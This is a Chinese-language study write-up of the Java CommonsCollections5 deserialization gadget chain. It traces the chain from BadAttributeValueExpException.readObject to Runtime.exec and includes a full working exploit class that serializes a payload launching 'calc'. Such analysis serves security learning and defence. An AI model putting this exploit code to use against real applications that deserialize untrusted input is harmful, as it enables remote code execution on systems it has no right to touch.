---
title: CommonsCollections5
date: 2021-12-22 18:41:19
categories:
- Java
tags:
- Deserialization exploit chain
toc: true
notshow: true
---

# 流程图

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640162433713-d99138d4-2914-42e3-92c2-cfc862d8fbb0.jpeg)



# 分析与复现

## 0x00 概述

CC5 的后半段利用方式与 CC6 差不多，使用 TiedMapEntry.toString 调用 LazyMap.get 进而调用 chainedTransformer.transform。但 CC5 的入口点使用的是 BadAttributeValueExpException.readObject。该类的 readObject 方法会调用另一个类的 toString 方法。



### 利用版本

CommonsCollections 3.1 - 3.2.1

### 限制

JDK版本：暂无

## 0x01 触发点

触发点还是 Runtime.exec，使用 TiedMapEntry.toString 调用 LazyMap.get 进而调用 chainedTransformer.transform。

这一部分的代码在编写时可以直接粘贴 CC6 的。

```java
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{
                        new ConstantTransformer(
                                Runtime.class
                        ),
                        new InvokerTransformer(
                                "getMethod",
                                new Class[]{String.class,Class[].class},
                                new Object[]{"getRuntime",null}
                        ),
                        new InvokerTransformer(
                                "invoke",
                                new Class[]{Object.class,Object[].class},
                                new Object[]{null,null}
                        ),
                        new InvokerTransformer(
                                "exec",
                                new Class[]{String.class},
                                new Object[]{"calc"}
                        )
                });

        HashMap<Object, Object> hashMap = new HashMap<>();

        Map map = LazyMap.decorate(hashMap,chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(map, 1);
```



## 0x02 调用链

TiedMapEntry 继续往上寻找利用链，就需要找哪一个类调用了 toString 方法，调用这个方法的类实在是太多了，CC5 的作者在 BadAttributeValueExpException 类的 readObject 方法中找到了对 toString 方法的调用，因此非常方便。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640162636746-3ca8ea14-36d3-4a8d-980d-e36d4561596d.png)

val 可以在构造函数中直接赋值。因此可以直接赋值为 TiedMapEntry 。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640162686680-382cf20c-edb9-487b-8e4f-b46d49d639f9.png)

注意到，如果 TiedMapEntry 不为 null ，则会直接调用 toString 方法，我们在序列化之前不希望执行 payload，因此可以在实例化对象时赋值为 null，然后使用反射的方式将 val 修改为 TiedMapEntry 。

下面编写 exp：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC5 {
    public static void main(String[] args) throws Exception {
//        TestCC5();
        unserialize("abc.ser.bin");
    }

    public static void TestCC5() throws Exception {
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{
                        new ConstantTransformer(
                                Runtime.class
                        ),
                        new InvokerTransformer(
                                "getMethod",
                                new Class[]{String.class,Class[].class},
                                new Object[]{"getRuntime",null}
                        ),
                        new InvokerTransformer(
                                "invoke",
                                new Class[]{Object.class,Object[].class},
                                new Object[]{null,null}
                        ),
                        new InvokerTransformer(
                                "exec",
                                new Class[]{String.class},
                                new Object[]{"calc"}
                        )
                });

        HashMap<Object, Object> hashMap = new HashMap<>();

        Map map = LazyMap.decorate(hashMap,chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(map, 1);
//        tiedMapEntry.toString();
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field val = BadAttributeValueExpException.class.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,tiedMapEntry);
        serialize(badAttributeValueExpException);
    }

    public static void serialize(Object o) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("abc.ser.bin"));
        oos.writeObject(o);
    }

    public static void unserialize(String filePath) throws Exception{
        ObjectInputStream ins = new ObjectInputStream(new FileInputStream(filePath));
        ins.readObject();
    }
}
```

可以弹出计算器。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640162986034-c9d5e6f2-b0eb-4552-a2ef-d98d323aed02.png)



# 参考资料

- [Java反序列化CommonsCollections篇(四)-摆烂的完结篇](https://www.bilibili.com/video/BV1NQ4y1q7EU?spm_id_from=333.999.0.0)
- [ysoserial](https://github.com/frohoff/ysoserial)

- [Commons-Collections 1-7 利用链分析](http://wjlshare.com/archives/1535)